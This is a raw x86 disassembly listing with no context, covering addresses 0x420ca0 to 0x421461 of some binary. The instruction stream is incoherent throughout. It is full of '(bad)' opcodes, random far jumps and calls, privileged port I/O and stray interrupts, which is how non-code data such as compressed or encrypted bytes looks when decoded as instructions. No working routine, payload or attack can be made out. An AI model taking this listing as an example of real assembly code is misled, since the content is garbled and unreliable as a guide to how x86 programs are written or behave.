  420ca0:	xor    al,0x4c
  420ca2:	ss inc ebx
  420ca4:	ret    0x35fe
  420ca7:	in     al,dx
  420ca8:	(bad)  
  420ca9:	fmulp  st(3),st
  420cab:	int    0x45
  420cad:	pop    ecx
  420cae:	push   esp
  420caf:	sub    eax,0xc3e6576e
  420cb4:	popa   
  420cb5:	adc    BYTE PTR [ebp+0x7c],dl
  420cb8:	push   edx
  420cb9:	jge    0x420c92
  420cbb:	out    0xd3,al
  420cbd:	push   edi
  420cbe:	loopne 0x420ce9
  420cc0:	js     0x420c9a
  420cc2:	add    edx,eax
  420cc4:	pushf  
  420cc5:	inc    ebx
  420cc6:	jne    0x420d17
  420cc8:	shl    al,1
  420cca:	in     al,dx
  420ccb:	jbe    0x420d03
  420ccd:	cmp    dh,BYTE PTR [ebx+0x6864991c]
  420cd3:	in     al,dx
  420cd4:	adc    al,0xd5
  420cd6:	inc    edi
  420cd7:	add    eax,0xf075eb86
  420cdc:	nop
  420cdd:	daa    
  420cde:	idiv   DWORD PTR [eax-0x4209ea34]
  420ce4:	lds    edx,FWORD PTR [ecx+ecx*2-0x5c]
  420ce8:	jo     0x420c8c
  420cea:	push   esp
  420ceb:	inc    eax
  420cec:	xchg   esi,eax
  420ced:	pop    esp
  420cee:	xchg   ebp,eax
  420cef:	ret    
  420cf0:	cmp    al,0x2a
  420cf2:	mov    edx,0xfa0cab3f
  420cf8:	loop   0x420ce9
  420cfa:	lahf   
  420cfb:	test   al,0x97
  420cfd:	cmp    ebp,DWORD PTR [edx-0x58]
  420d00:	ins    DWORD PTR es:[edi],dx
  420d01:	push   esp
  420d02:	sbb    esi,ecx
  420d04:	or     DWORD PTR [ebp+0x3f94d78c],esp
  420d0a:	ret    0x5366
  420d0d:	(bad)  
  420d0e:	loop   0x420d65
  420d10:	js     0x420cde
  420d12:	xor    eax,0x813014aa
  420d17:	dec    esp
  420d18:	(bad)  
  420d19:	sahf   
  420d1a:	fld    TBYTE PTR [ecx+0x51fa1be0]
  420d20:	push   es
  420d21:	push   esp
  420d22:	cmc    
  420d23:	cmp    cl,cl
  420d25:	clc    
  420d26:	dec    esp
  420d27:	xor    esp,DWORD PTR [ebp-0x21]
  420d2a:	pop    ebx
  420d2b:	and    ah,al
  420d2d:	stos   DWORD PTR es:[edi],eax
  420d2e:	repnz (bad) 
  420d30:	test   eax,0x838ebc7
  420d35:	add    ebp,edx
  420d37:	mov    eax,0xe16db2f9
  420d3c:	push   cs
  420d3d:	call   FWORD PTR [edx+edi*1]
  420d40:	mov    ch,0xe2
  420d42:	sahf   
  420d43:	xchg   ebp,ecx
  420d45:	pop    esi
  420d46:	div    BYTE PTR [eax+0x56]
  420d49:	addr16 mov eax,0x6b3434eb
  420d4f:	jle    0x420dd0
  420d51:	iret   
  420d52:	clc    
  420d53:	jbe    0x420d49
  420d55:	inc    edi
  420d56:	loopne 0x420d3e
  420d58:	inc    eax
  420d59:	xchg   ecx,eax
  420d5a:	xchg   esp,eax
  420d5b:	sub    ah,al
  420d5d:	mov    dl,0x15
  420d5f:	cmp    cl,bh
  420d61:	int    0xe5
  420d63:	push   edx
  420d64:	mov    dl,ah
  420d66:	add    DWORD PTR [ecx-0x1883ed59],edx
  420d6c:	mov    edx,0x110e0121
  420d71:	scas   al,BYTE PTR es:[edi]
  420d72:	into   
  420d73:	scas   al,BYTE PTR es:[edi]
  420d74:	(bad)  
  420d75:	lods   eax,DWORD PTR ds:[esi]
  420d76:	push   0xffffffd6
  420d78:	popa   
  420d79:	jae    0x420da7
  420d7b:	cld    
  420d7c:	push   edx
  420d7d:	stos   BYTE PTR es:[edi],al
  420d7e:	dec    ebx
  420d7f:	cmp    ecx,DWORD PTR [edx-0x49]
  420d82:	mov    esp,0x6120a0ec
  420d87:	rcr    DWORD PTR [edi+0x41ff2b68],cl
  420d8d:	sbb    bh,BYTE PTR [edi+ecx*1-0x26]
  420d91:	test   al,0xbe
  420d93:	inc    ebx
  420d94:	scas   eax,DWORD PTR es:[edi]
  420d95:	repz (bad) 
  420d97:	faddp  st(7),st
  420d99:	std    
  420d9a:	in     al,0x4f
  420d9c:	pusha  
  420d9d:	iret   
  420d9e:	(bad)  
  420d9f:	dec    ebp
  420da0:	push   ss
  420da1:	(bad)  
  420da2:	inc    eax
  420da3:	pop    es
  420da4:	jnp    0x420e1d
  420da6:	push   0xffffff8d
  420da8:	jne    0x420db2
  420daa:	das    
  420dab:	mov    WORD PTR [edi-0x620818f8],es
  420db1:	int    0x29
  420db3:	jmp    0x7969b57
  420db8:	xchg   esi,eax
  420db9:	pop    es
  420dba:	xchg   esp,eax
  420dbb:	ret    0xea3b
  420dbe:	jo     0x420dda
  420dc0:	fistp  DWORD PTR [ebp-0x35]
  420dc3:	(bad)  
  420dc4:	test   dh,0x22
  420dc7:	je     0x420db4
  420dc9:	adc    BYTE PTR [ecx],ch
  420dcb:	jge    0x420d5d
  420dcd:	push   ebp
  420dce:	push   cs
  420dcf:	push   cs
  420dd0:	(bad)  
  420dd1:	mov    edi,DWORD PTR [esi]
  420dd3:	cmove  ebp,DWORD PTR [edx+0x4989776f]
  420dda:	ja     0x420dd8
  420ddc:	push   ss
  420ddd:	adc    DWORD PTR [ebx],ebx
  420ddf:	add    bh,cl
  420de1:	mov    ecx,0xb0875d8c
  420de6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420de7:	pusha  
  420de8:	cwde   
  420de9:	mov    BYTE PTR [edx-0x6c960cf3],bh
  420def:	cdq    
  420df0:	pop    edx
  420df1:	loop   0x420d94
  420df3:	iret   
  420df4:	add    BYTE PTR [eax],ch
  420df6:	rol    BYTE PTR [ecx+0x44babe9b],0x87
  420dfd:	ficom  DWORD PTR [edx]
  420dff:	mov    eax,DWORD PTR [ecx]
  420e01:	loop   0x420d9f
  420e03:	loopne 0x420e67
  420e05:	icebp  
  420e06:	xor    bl,ah
  420e08:	dec    eax
  420e09:	pop    eax
  420e0a:	sub    al,0x1f
  420e0c:	xchg   DWORD PTR [ebp-0x59c2df4b],ebx
  420e12:	arpl   si,dx
  420e14:	les    esp,FWORD PTR [eax]
  420e16:	inc    edi
  420e17:	ffree  st(7)
  420e19:	lods   al,BYTE PTR ds:[esi]
  420e1a:	xchg   BYTE PTR [ebx+0x39],al
  420e1d:	retf   
  420e1e:	js     0x420e2c
  420e20:	sahf   
  420e21:	inc    edx
  420e22:	sub    DWORD PTR [ecx-0x4be66a57],0x6a23a7df
  420e2c:	int3   
  420e2d:	dec    edx
  420e2e:	shl    ah,1
  420e30:	js     0x420e9d
  420e32:	mov    al,BYTE PTR [ebx-0x4f]
  420e35:	outs   dx,BYTE PTR ds:[esi]
  420e36:	in     al,0x55
  420e38:	mov    ebx,0x2caf91ba
  420e3d:	pop    ds
  420e3e:	call   0x359dbd2
  420e43:	gs pop ecx
  420e45:	(bad)  
  420e46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e47:	es add al,0xdb
  420e4a:	dec    ebp
  420e4b:	les    edx,FWORD PTR [ebx+esi*1]
  420e4e:	popa   
  420e4f:	jmp    0x420e30
  420e51:	lahf   
  420e52:	pop    ebx
  420e53:	mov    esp,0xd0a3a726
  420e58:	adc    esi,DWORD PTR [esi-0x69]
  420e5b:	int3   
  420e5c:	jp     0x420e0d
  420e5e:	or     DWORD PTR [ecx-0x63],edi
  420e61:	jb     0x420ea2
  420e63:	mov    eax,ds:0xd16d95ee
  420e68:	scas   al,BYTE PTR es:[edi]
  420e69:	inc    esi
  420e6a:	mov    eax,ds:0xe5094c16
  420e6f:	rcl    BYTE PTR [ebx-0x2fdaad5e],0x60
  420e76:	and    eax,0xf65cfc77
  420e7b:	sbb    BYTE PTR [edi+eax*8+0x40],0x86
  420e80:	test   eax,0x9e9f1629
  420e85:	rcr    BYTE PTR [esi+0x953c83c],cl
  420e8b:	repnz push edx
  420e8d:	ss sub cl,bl
  420e90:	adc    BYTE PTR ds:0x2ad6e853,dh
  420e96:	dec    esp
  420e97:	loop   0x420f13
  420e99:	push   ds
  420e9a:	loop   0x420e23
  420e9c:	push   ss
  420e9d:	aam    0x81
  420e9f:	or     DWORD PTR [edx+edi*4],0x297a16f9
  420ea6:	imul   dh
  420ea8:	test   al,0x20
  420eaa:	mov    DWORD PTR [esi+ecx*4-0x24447104],edi
  420eb1:	jle    0x420f0f
  420eb3:	xchg   edi,eax
  420eb4:	mov    esi,0xde262fb1
  420eb9:	fimul  WORD PTR [ecx+ebp*8+0x4d]
  420ebd:	sbb    eax,0x294a861b
  420ec2:	and    edx,DWORD PTR [edi]
  420ec4:	fistp  WORD PTR [esi+0x0]
  420ec7:	mov    al,0x35
  420ec9:	sub    bh,BYTE PTR [ecx+0x78b562bd]
  420ecf:	and    eax,0xe665d2ca
  420ed4:	adc    dh,cl
  420ed6:	sbb    BYTE PTR [edx],dl
  420ed8:	xchg   ecx,eax
  420ed9:	test   eax,0x24a63d15
  420ede:	push   edi
  420edf:	test   eax,0xda81097c
  420ee4:	and    cl,dl
  420ee6:	retf   0x66dc
  420ee9:	int3   
  420eea:	pop    ecx
  420eeb:	ror    DWORD PTR [eax-0x35807ab0],cl
  420ef1:	xor    bh,al
  420ef3:	leave  
  420ef4:	jo     0x420e92
  420ef6:	jle    0x420eba
  420ef8:	dec    edx
  420ef9:	cmp    ch,0xb3
  420efc:	adc    ebx,DWORD PTR [ecx-0x16]
  420eff:	nop
  420f00:	pop    esp
  420f01:	outs   dx,BYTE PTR ds:[esi]
  420f02:	les    ecx,FWORD PTR [ecx+esi*4]
  420f05:	mov    edx,0x17431229
  420f0a:	out    dx,eax
  420f0b:	pop    ss
  420f0c:	iret   
  420f0d:	rol    DWORD PTR [eax],0x38
  420f10:	mov    ?,WORD PTR [ebp+0x59f79b82]
  420f16:	fmul   DWORD PTR [ecx-0x55484244]
  420f1c:	dec    edi
  420f1d:	cmp    al,0x7a
  420f1f:	xchg   ebp,eax
  420f20:	xchg   esi,eax
  420f21:	inc    edx
  420f22:	out    dx,eax
  420f23:	and    ebp,ecx
  420f25:	ret    0x8d6d
  420f28:	jmp    0xc987:0x1b05da3f
  420f2f:	and    al,0x93
  420f31:	add    ebx,DWORD PTR [esi+0xe50b30e]
  420f37:	mov    WORD PTR [ebx-0x1dd8eb60],?
  420f3d:	hlt    
  420f3e:	push   ecx
  420f3f:	and    DWORD PTR [esi+0x3a],esp
  420f42:	in     al,0x92
  420f44:	sbb    ecx,ecx
  420f46:	popa   
  420f47:	in     eax,0x51
  420f49:	cmp    BYTE PTR [esi+0x67],bl
  420f4c:	xlat   BYTE PTR ds:[ebx]
  420f4d:	(bad)  
  420f4e:	sbb    DWORD PTR [ebp+0x43e777e7],ecx
  420f54:	retf   0x801b
  420f57:	call   0x9c871088
  420f5c:	mov    edx,0x57e6e248
  420f61:	pop    esi
  420f62:	stos   DWORD PTR es:[edi],eax
  420f63:	sub    ebp,DWORD PTR [ebx-0x17db3fdb]
  420f69:	xchg   cx,ax
  420f6b:	loopne 0x420f3d
  420f6d:	pop    ecx
  420f6e:	jp     0x420f7c
  420f70:	and    al,0x14
  420f72:	aaa    
  420f73:	loope  0x420fb5
  420f75:	icebp  
  420f76:	mov    ch,0x6a
  420f78:	lods   eax,DWORD PTR ds:[esi]
  420f79:	retf   0x9e9e
  420f7c:	cmp    bh,BYTE PTR [eax+edi*2]
  420f7f:	call   0x40c7:0x73a2eb2
  420f86:	jg     0x420ff1
  420f88:	push   esi
  420f89:	(bad)  
  420f8a:	mov    dl,0xe2
  420f8c:	mov    bl,0xae
  420f8e:	pushf  
  420f8f:	(bad)  
  420f90:	dec    eax
  420f91:	jle    0x420f95
  420f93:	mov    ds:0x8924c5ef,al
  420f98:	push   esi
  420f99:	int3   
  420f9a:	dec    edi
  420f9b:	frstor [ebp-0x6975af9b]
  420fa1:	jle    0x420fcd
  420fa3:	cmp    BYTE PTR [ebx-0x735f57b5],bh
  420fa9:	int    0xf
  420fab:	xchg   esp,eax
  420fac:	push   0xfffffff5
  420fae:	sbb    ebp,edx
  420fb0:	or     BYTE PTR [edi+0xb02d5be],0x82
  420fb7:	adc    ch,bl
  420fb9:	push   edi
  420fba:	adc    bl,BYTE PTR [edx]
  420fbc:	into   
  420fbd:	jmp    0x53dceb1d
  420fc2:	mov    ah,0xa1
  420fc4:	xchg   edi,eax
  420fc5:	xor    cl,ch
  420fc7:	inc    ecx
  420fc8:	xor    BYTE PTR [edi-0x47ceab09],dh
  420fce:	add    al,0xf7
  420fd0:	jecxz  0x421008
  420fd2:	cmp    DWORD PTR [ebp+0x36],ecx
  420fd5:	fimul  DWORD PTR [esi]
  420fd7:	shl    DWORD PTR [ecx-0x209edfd1],0x27
  420fde:	scas   al,BYTE PTR es:[edi]
  420fdf:	and    edx,esp
  420fe1:	pop    ebp
  420fe2:	pop    edx
  420fe3:	pop    edx
  420fe4:	push   esi
  420fe5:	sti    
  420fe6:	arpl   WORD PTR [ebx+0x11],bp
  420fe9:	sbb    al,0xd5
  420feb:	push   eax
  420fec:	inc    eax
  420fed:	xor    BYTE PTR [ebx+0x26],cl
  420ff0:	daa    
  420ff1:	pop    ebp
  420ff2:	mov    WORD PTR [ebp+0x11],?
  420ff5:	sub    bl,ah
  420ff7:	xor    al,0x85
  420ff9:	or     DWORD PTR [edx+0x73f43ed],esp
  420fff:	(bad)  
  421000:	stc    
  421001:	jmp    0x45f012f7
  421006:	ins    BYTE PTR es:[edi],dx
  421007:	outs   dx,BYTE PTR ds:[esi]
  421008:	inc    edx
  421009:	pop    esi
  42100a:	lock icebp 
  42100c:	daa    
  42100d:	push   ebp
  42100e:	sti    
  42100f:	sub    eax,0x4839df4e
  421014:	ret    
  421015:	mov    ah,0x62
  421017:	es push cs
  421019:	adc    BYTE PTR ds:0xb8462a06,dl
  42101f:	or     BYTE PTR [ecx-0x78],dh
  421022:	push   ss
  421023:	arpl   si,dx
  421025:	jge    0x421013
  421027:	xlat   BYTE PTR ss:[ebx]
  421029:	or     DWORD PTR [edi-0x5a],ebx
  42102c:	imul   edi,DWORD PTR [esi],0x45
  42102f:	jno    0x420fda
  421031:	(bad)  
  421032:	mov    ds:0x47595851,al
  421037:	pop    eax
  421038:	stos   DWORD PTR es:[edi],eax
  421039:	das    
  42103a:	jp     0x420fd3
  42103c:	fmulp  st(1),st
  42103e:	cmp    eax,0x31153123
  421043:	pop    ecx
  421044:	adc    ecx,DWORD PTR [esi+0x4c]
  421047:	test   esp,0x6ee72833
  42104d:	inc    edx
  42104e:	xor    dh,BYTE PTR [edi-0x13bd97a3]
  421054:	mov    cl,0x74
  421056:	push   0xffffffca
  421058:	sbb    al,0x79
  42105a:	daa    
  42105b:	cmp    bh,0x8b
  42105e:	xchg   ebp,eax
  42105f:	jns    0x42101d
  421061:	lds    edx,FWORD PTR [ecx+esi*4+0x61]
  421065:	cmp    esp,DWORD PTR [edx+edi*1]
  421068:	sti    
  421069:	outs   dx,BYTE PTR ds:[esi]
  42106a:	(bad)  
  42106b:	push   es
  42106c:	jmp    0xb9dbbf2c
  421071:	repz push cs
  421073:	pop    ecx
  421074:	shl    DWORD PTR [ebx],0xe1
  421077:	nop
  421078:	or     esi,DWORD PTR [edx-0x35]
  42107b:	call   0x4496:0xa19edc82
  421082:	fstp   DWORD PTR [ebx-0x1fefcc7]
  421088:	push   esp
  421089:	pop    ebx
  42108a:	sbb    dh,BYTE PTR [ebx+0x10]
  42108d:	jns    0x421070
  42108f:	pop    esi
  421090:	stos   BYTE PTR es:[edi],al
  421091:	inc    ebx
  421092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421093:	cmp    ebx,ebp
  421095:	jge    0x421046
  421097:	mov    ds:0x2716019b,al
  42109c:	mov    ah,al
  42109e:	xchg   ecx,eax
  42109f:	lea    ecx,ds:0x67df36b9
  4210a5:	outs   dx,DWORD PTR ds:[esi]
  4210a6:	dec    edi
  4210a7:	(bad)  
  4210a8:	(bad)  ds:0xf0b66a0b
  4210ae:	out    0x97,eax
  4210b0:	mov    esi,0x471057d2
  4210b5:	rcl    DWORD PTR [edi-0x2224e7db],cl
  4210bb:	jmp    0x9569:0xb1424ab1
  4210c2:	sub    esi,edi
  4210c4:	xor    esp,edi
  4210c6:	xor    BYTE PTR [edx+ebx*4-0x24],dh
  4210ca:	sub    DWORD PTR [edi],esp
  4210cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210cd:	adc    edi,edi
  4210cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210d0:	sbb    eax,0xbf670a99
  4210d5:	inc    ebx
  4210d6:	mov    dh,0x9c
  4210d8:	dec    esp
  4210d9:	lea    edi,[edi+0x211ff035]
  4210df:	add    BYTE PTR [ecx-0x3572483f],al
  4210e5:	icebp  
  4210e6:	adc    ebx,DWORD PTR [edi+0x220760aa]
  4210ec:	in     al,0x1f
  4210ee:	arpl   WORD PTR ds:0xe44a167a,sp
  4210f4:	call   0xe8f8:0x720a925a
  4210fb:	pop    es
  4210fc:	in     eax,0x7a
  4210fe:	ret    0x304f
  421101:	imul   esi,DWORD PTR [esi-0xa],0xda529bf2
  421108:	fdivr  DWORD PTR [ebx-0x3962dcdd]
  42110e:	sbb    eax,0xd4c9b57d
  421113:	test   al,0xb5
  421115:	test   eax,0x6ff2a7c4
  42111a:	addr16 mov esi,0xf020b9be
  421120:	stc    
  421121:	xor    DWORD PTR [ebx-0x54],ebp
  421124:	cmc    
  421125:	inc    esi
  421126:	(bad)  
  421127:	jmp    0xc1966a83
  42112c:	in     eax,0x9e
  42112e:	cli    
  42112f:	scas   eax,DWORD PTR es:[edi]
  421130:	ds popa 
  421132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421133:	sar    BYTE PTR [edi-0x2195f7b2],0xf9
  42113a:	addr16 out dx,eax
  42113c:	mov    bh,0x2f
  42113e:	mov    ebx,0xe13e4547
  421143:	(bad)  
  421144:	dec    edi
  421145:	imul   ebp,DWORD PTR ds:0xcb40fbae,0x76
  42114c:	mov    cs,eax
  42114e:	cli    
  42114f:	sahf   
  421150:	add    DWORD PTR [ebx],edx
  421152:	or     bl,BYTE PTR [edx+0x13df44e5]
  421158:	cmp    dh,cl
  42115a:	enter  0x774c,0x9d
  42115e:	(bad)  
  42115f:	in     al,dx
  421160:	pushfw 
  421162:	loop   0x4211ba
  421164:	pop    edx
  421165:	mov    ebp,0x6a1ce6b4
  42116a:	jmp    0x4211d4
  42116c:	dec    ebp
  42116d:	into   
  42116e:	ja     0x42117b
  421170:	pop    ebx
  421171:	bnd jns 0x4211d5
  421174:	mov    ecx,0xfbd22909
  421179:	ins    BYTE PTR es:[edi],dx
  42117a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  42117c:	ja     0x4211c3
  42117e:	test   eax,0x2ea150c5
  421183:	cmp    al,0x8a
  421185:	adc    esp,DWORD PTR [ecx]
  421187:	daa    
  421188:	adc    eax,0x780e2790
  42118d:	ror    esi,cl
  42118f:	xchg   esi,eax
  421190:	fild   QWORD PTR [esi+edx*1-0x502097df]
  421197:	push   esp
  421198:	dec    edx
  421199:	fdivr  DWORD PTR [esi+ecx*2-0x7d96db98]
  4211a0:	stos   DWORD PTR es:[edi],eax
  4211a1:	and    esp,DWORD PTR [ecx+0x66]
  4211a4:	pop    ecx
  4211a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211a6:	xchg   esp,eax
  4211a7:	push   esp
  4211a8:	jmp    FWORD PTR fs:[edx+ecx*2+0x13f8d9a0]
  4211b0:	add    eax,0xb095d5fc
  4211b5:	cmp    eax,0xbf3d0ca2
  4211ba:	data16 mov bl,dl
  4211bd:	addr16 aaa 
  4211bf:	pusha  
  4211c0:	pop    ebx
  4211c1:	pop    es
  4211c2:	mov    esp,ebx
  4211c4:	fiadd  DWORD PTR [ebp+0x499d8129]
  4211ca:	nop
  4211cb:	cdq    
  4211cc:	dec    esp
  4211cd:	scas   al,BYTE PTR es:[edi]
  4211ce:	es out dx,eax
  4211d0:	pop    edi
  4211d1:	sub    al,0x6a
  4211d3:	ss int3 
  4211d5:	mov    dl,0x57
  4211d7:	clc    
  4211d8:	pop    es
  4211d9:	test   al,0x44
  4211db:	and    eax,0xcba4e0c2
  4211e0:	ins    DWORD PTR es:[edi],dx
  4211e1:	dec    esi
  4211e2:	adc    al,0x52
  4211e4:	addr16 in al,dx
  4211e6:	nop
  4211e7:	or     DWORD PTR [ebx+0x78],esp
  4211ea:	int    0xd3
  4211ec:	dec    esi
  4211ee:	mov    ds:0x3b89a43b,al
  4211f3:	jno    0x421249
  4211f5:	dec    ebp
  4211f6:	pop    edi
  4211f7:	pop    ss
  4211f8:	dec    edx
  4211f9:	(bad)  
  4211fa:	sub    al,0xea
  4211fc:	enter  0x83a0,0xf0
  421200:	retf   
  421201:	outs   dx,BYTE PTR ds:[esi]
  421202:	fwait
  421203:	inc    ebp
  421204:	add    al,0x6d
  421206:	std    
  421207:	fstp   DWORD PTR [edi]
  421209:	mov    WORD PTR [ebx+eiz*8+0x15],es
  42120d:	adc    BYTE PTR [edx-0x7],0x3a
  421211:	aas    
  421212:	mov    fs,WORD PTR [esi+0x27111bd0]
  421218:	xor    esp,edi
  42121a:	loop   0x42121b
  42121c:	push   0x12302040
  421221:	dec    edi
  421222:	int    0xfa
  421224:	repz push edx
  421226:	sbb    DWORD PTR [ebx+0x216b7640],edx
  42122c:	pop    esi
  42122d:	jg     0x4211f2
  42122f:	out    0x88,al
  421231:	cmp    edx,ebx
  421233:	scas   al,BYTE PTR es:[edi]
  421234:	pop    esp
  421235:	xchg   DWORD PTR [esi-0x5d],esp
  421238:	test   eax,0x3ea5209
  42123d:	pop    edi
  42123e:	add    BYTE PTR [ecx],ch
  421240:	ss cwde 
  421242:	mov    ecx,0xdbbf4fe
  421247:	sti    
  421248:	mov    cl,bl
  42124a:	dec    ebx
  42124b:	mov    WORD PTR [esi+0x3c406723],fs
  421251:	adc    BYTE PTR ds:0x70818aa4,bl
  421257:	shr    BYTE PTR [ecx-0x42],0x26
  42125b:	mov    BYTE PTR fs:0x198efec0,ah
  421262:	dec    esi
  421263:	xor    eax,0xb000f956
  421268:	xor    eax,0x1d4cd644
  42126d:	adc    dh,BYTE PTR fs:0xa057b7b1
  421274:	scas   eax,DWORD PTR es:[edi]
  421275:	mov    ds,WORD PTR [esi-0x1d]
  421278:	sub    DWORD PTR ds:0xe5df252d,edi
  42127e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42127f:	sbb    DWORD PTR [eax+0x566b13c9],edi
  421285:	fs pop esp
  421287:	ret    0x27c8
  42128a:	xor    eax,0x5f63b919
  42128f:	jmp    0x421246
  421291:	sbb    BYTE PTR [ebx-0x44],ah
  421294:	(bad)  
  421295:	mov    ebp,0xd82b08ba
  42129a:	fcomi  st,st(3)
  42129c:	test   BYTE PTR [edi-0xa],cl
  42129f:	adc    eax,0x944f009
  4212a4:	dec    ecx
  4212a5:	daa    
  4212a6:	rol    BYTE PTR [ebx+eiz*8],0x16
  4212aa:	rcr    BYTE PTR [edi+0x511958ea],1
  4212b0:	enter  0x9c03,0xf8
  4212b4:	popa   
  4212b5:	push   ebx
  4212b6:	das    
  4212b7:	mov    dl,0xe
  4212b9:	mov    dl,0xf0
  4212bb:	push   es
  4212bc:	dec    esp
  4212bd:	pop    es
  4212be:	and    DWORD PTR [ebp-0x7d],esp
  4212c1:	xor    DWORD PTR [esp+ebp*2],eax
  4212c4:	sbb    BYTE PTR [ebx-0x66eaa32a],ch
  4212ca:	or     al,0x76
  4212cc:	and    al,0xc3
  4212ce:	sbb    esp,DWORD PTR [esi+0xba3dd85]
  4212d4:	xchg   DWORD PTR [esi+0x47dbca9d],ebp
  4212da:	xor    dl,BYTE PTR [edi+0x61]
  4212dd:	fnstenv [eax]
  4212df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212e0:	xchg   ecx,eax
  4212e1:	icebp  
  4212e2:	scas   al,BYTE PTR es:[edi]
  4212e3:	(bad)  
  4212e4:	dec    edx
  4212e5:	jmp    0x4212e8
  4212e7:	mov    dh,0xb1
  4212e9:	test   eax,0xf9eecf4b
  4212ee:	stc    
  4212ef:	fwait
  4212f0:	xor    BYTE PTR [ebx-0x6b],0xd
  4212f4:	(bad)  
  4212f6:	xchg   ebx,eax
  4212f7:	cmp    al,0x9f
  4212f9:	xchg   ebx,eax
  4212fa:	cmc    
  4212fb:	ins    BYTE PTR es:[edi],dx
  4212fc:	imul   edi,DWORD PTR gs:[edx+ebp*4+0x70],0x49
  421302:	mov    fs,ebx
  421304:	mov    dl,0xde
  421306:	rcl    DWORD PTR [edx-0x65],0xcd
  42130a:	fmulp  st(1),st
  42130c:	aas    
  42130d:	dec    esi
  42130e:	or     BYTE PTR ss:[edx],0xea
  421312:	nop
  421313:	mov    esp,0xe3ea3fa
  421318:	sub    BYTE PTR [esi-0x60c26e6f],dl
  42131e:	pop    edi
  42131f:	aas    
  421320:	cs cwde 
  421322:	aas    
  421323:	xchg   ebx,eax
  421324:	cdq    
  421325:	into   
  421326:	push   edx
  421327:	pop    esp
  421328:	lock xchg esp,eax
  42132a:	out    dx,eax
  42132b:	sub    edx,DWORD PTR [edi+0x1e21f619]
  421331:	pop    edx
  421332:	scas   al,BYTE PTR es:[edi]
  421333:	add    al,0x6f
  421335:	dec    ecx
  421336:	idiv   al
  421338:	or     eax,0xf96760f9
  42133d:	fadd   QWORD PTR [ecx+0x62]
  421340:	(bad)  
  421341:	sub    eax,0x70c97853
  421346:	mov    ds:0xc6508c53,eax
  42134b:	hlt    
  42134c:	mov    esp,0x18f9d6b1
  421351:	cmp    edx,eax
  421353:	or     eax,0xcece9439
  421358:	inc    edx
  421359:	add    ah,BYTE PTR [ebp-0x5a]
  42135c:	xor    dh,al
  42135e:	adc    bl,cl
  421360:	scas   al,BYTE PTR es:[edi]
  421361:	shl    DWORD PTR [edi],cl
  421363:	ins    DWORD PTR es:[edi],dx
  421364:	add    eax,0xf4cd2e8d
  421369:	inc    eax
  42136a:	push   ds
  42136b:	sti    
  42136c:	cmp    edi,DWORD PTR [eax]
  42136e:	pop    edi
  421370:	repz or DWORD PTR [esi+ecx*4],0x5b
  421375:	or     al,BYTE PTR [eax-0x27407148]
  42137b:	stos   BYTE PTR es:[edi],al
  42137c:	and    eax,0x3053f84b
  421381:	fistp  WORD PTR [edx-0x56]
  421384:	in     eax,0x72
  421386:	aas    
  421387:	or     ah,BYTE PTR [ebp-0x4555bcf0]
  42138d:	(bad)  
  42138e:	mov    ch,0x59
  421390:	out    dx,eax
  421391:	jbe    0x42138c
  421393:	sbb    BYTE PTR [esi+0x10],bl
  421396:	popa   
  421397:	fsubr  QWORD PTR [ebp+0x1b]
  42139a:	in     al,0x7
  42139c:	pop    ss
  42139d:	rcl    ch,1
  42139f:	mov    esp,ecx
  4213a1:	out    0x56,al
  4213a3:	xchg   BYTE PTR [esi-0x61],dl
  4213a6:	clc    
  4213a7:	into   
  4213a8:	add    eax,0xdb5875db
  4213ad:	shl    DWORD PTR [ecx+edi*4-0x48],0x6b
  4213b2:	inc    eax
  4213b3:	call   0xf42aa189
  4213b8:	fxsave [eax+esi*8]
  4213bc:	std    
  4213bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213be:	dec    edi
  4213bf:	xchg   ecx,eax
  4213c0:	add    esp,DWORD PTR [esi]
  4213c2:	in     eax,0x67
  4213c4:	mov    edx,0xa20c61a
  4213c9:	xor    bh,dh
  4213cb:	xlat   BYTE PTR ds:[ebx]
  4213cc:	jo     0x421441
  4213ce:	sbb    al,0x27
  4213d0:	or     BYTE PTR [edx+0x3c],dl
  4213d3:	mov    bl,0x4c
  4213d5:	xchg   edx,eax
  4213d6:	call   0x51d5:0x5015fb62
  4213dd:	pop    eax
  4213de:	dec    edx
  4213df:	clc    
  4213e0:	call   0x4609:0xf0fe3a0d
  4213e7:	retf   0x287d
  4213ea:	lods   eax,DWORD PTR ds:[esi]
  4213eb:	dec    ebp
  4213ec:	fild   DWORD PTR [eax]
  4213ee:	stos   BYTE PTR es:[edi],al
  4213ef:	rcl    DWORD PTR [eax-0x788023aa],cl
  4213f5:	adc    DWORD PTR [ebx],ebp
  4213f7:	adc    esp,DWORD PTR [esi]
  4213f9:	mov    WORD PTR [ecx],ds
  4213fb:	jle    0x4213a4
  4213fd:	clc    
  4213fe:	mov    eax,ds:0xcd23fd92
  421403:	push   es
  421404:	ds push ecx
  421407:	cli    
  421408:	mov    ebp,0xbe78091e
  42140d:	cwde   
  42140e:	xchg   esi,eax
  42140f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421410:	int    0xb5
  421412:	cmp    eax,0xa3d7c668
  421417:	xor    ah,cl
  421419:	add    esp,edx
  42141b:	in     eax,dx
  42141c:	ffreep st(5)
  42141e:	stos   BYTE PTR es:[edi],al
  42141f:	and    bh,al
  421421:	jp     0x421407
  421423:	test   eax,0xf2a0fb85
  421428:	pop    edi
  421429:	push   ss
  42142a:	jmp    0x4213fd
  42142c:	or     eax,0xa63eb12b
  421431:	sti    
  421432:	int3   
  421433:	imul   esi,DWORD PTR [ebx+0x2e],0x24d8a654
  42143a:	scas   eax,DWORD PTR es:[edi]
  42143b:	mov    ebx,0x433031c7
  421440:	mov    esp,0xc8c01d07
  421445:	repnz pop esi
  421447:	outs   dx,DWORD PTR ds:[esi]
  421448:	cmp    cl,dl
  42144a:	mov    esi,0x3b44c829
  42144f:	fs pop esp
  421451:	sub    eax,0x6a96e509
  421456:	xor    esp,DWORD PTR [eax+0x2085ef53]
  42145c:	xor    eax,0x4aa61763
  421461:	aaa    
